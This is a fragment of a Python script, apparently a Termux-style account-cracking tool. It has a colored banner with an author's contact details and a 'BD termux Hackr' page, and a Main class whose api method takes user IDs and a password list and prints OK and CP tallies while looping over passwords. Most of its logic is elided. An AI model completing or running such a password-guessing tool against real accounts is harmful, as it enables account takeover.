...
\033[1;32m║════════════════════════║
\033[1;32m║AUTHOR    : MD Hossain  ║║ \x1b[1;91m
\033[1;32m║═════════════════════ ═══║
\033[1;32m║WHATSAPP  : +8801735787710             ║
\033[1;32m║══════════════════════════
\033[1;32m║GITHUB    : Hossain CYBER                       ║
\033[1;32m║════════════════════════  ║
\033[1;32m║SERVER    : DATA - WIFI WORKING        
\033[1;32m║═════════════════════════
\033[1;32m║FACEBOOK : SAMI X TEN                          ║
\033[1;32m║═════════════════════════
\033[1;32m║FB PAGE :  BD termux Hackr. com                                ║
\033[1;32m╚════════════════════════
def ud():
...
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[hossain - CYBER] : %s/%s -> \033[0;97m [OK:%s ] \033[0;97m[OK:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
